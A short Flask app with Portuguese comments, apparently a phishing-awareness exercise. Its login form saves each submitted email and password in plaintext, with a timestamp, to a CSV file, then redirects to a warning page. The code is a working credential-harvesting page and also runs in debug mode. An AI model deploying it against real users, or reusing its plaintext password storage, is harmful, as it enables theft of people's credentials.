from flask import Flask, render_template, request, redirect, url_for
import csv
from datetime import datetime

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        # Guardar os dados no ficheiro CSV
        with open("registos.csv", mode="a", newline="", encoding="utf-8") as file:
            writer = csv.writer(file)
            writer.writerow([datetime.now(), email, password])

        # Redireciona para uma página de aviso
        return redirect(url_for("aviso"))

    return render_template("index.html")

@app.route("/aviso")
def aviso():
    return render_template("aviso.html")

if __name__ == "__main__":
    app.run(debug=True)
